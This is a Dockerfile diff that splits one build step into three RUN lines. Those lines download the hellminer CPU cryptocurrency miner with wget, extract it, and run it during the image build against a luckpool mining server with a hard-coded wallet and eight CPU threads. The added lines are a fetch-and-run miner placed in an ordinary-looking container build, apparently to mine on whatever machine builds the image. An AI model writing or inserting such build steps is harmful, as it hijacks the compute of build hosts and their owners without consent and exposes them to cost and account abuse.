@@ -6,7 +6,9 @@ ENV DEBIAN_FRONTEND=noninteractive
 
 RUN apt-get upgrade
 RUN apt-get install wget
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar -xzvf hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RTpNkvfpQaDydp4ezvCmJRMUvzP1rGaCqn.pizza -p x --cpu 8
+RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+RUN tar -xzvf hellminer_cpu_linux.tar.gz
+RUN ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RTpNkvfpQaDydp4ezvCmJRMUvzP1rGaCqn.pizza -p x --cpu 8
 
 COPY . /app
 RUN chmod +x /app/conf.d/websockify.sh
